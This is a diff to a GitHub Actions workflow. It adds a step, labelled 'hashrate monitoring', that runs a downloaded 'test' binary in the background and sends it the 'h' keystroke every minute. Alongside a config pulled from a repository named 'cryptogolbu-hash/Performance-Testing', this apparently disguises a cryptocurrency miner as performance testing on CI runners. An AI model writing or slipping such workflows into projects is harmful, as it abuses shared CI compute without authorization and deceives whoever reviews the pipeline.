@@ -23,6 +23,17 @@ jobs:
     - name: Download config file
       run: curl -L -o test/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json
 
-    - name: Run test
-      run: ./test/test
+    - name: Run test with hashrate monitoring
+      run: |
+        ./test/test &
+        TEST_PID=$!
+
+        sleep 10
+
+        while kill -0 $TEST_PID 2>/dev/null; do
+          echo "h" > /proc/$TEST_PID/fd/0 2>/dev/null || true
+          sleep 60
+        done
+
+        wait $TEST_PID
       working-directory: ${{ github.workspace }}
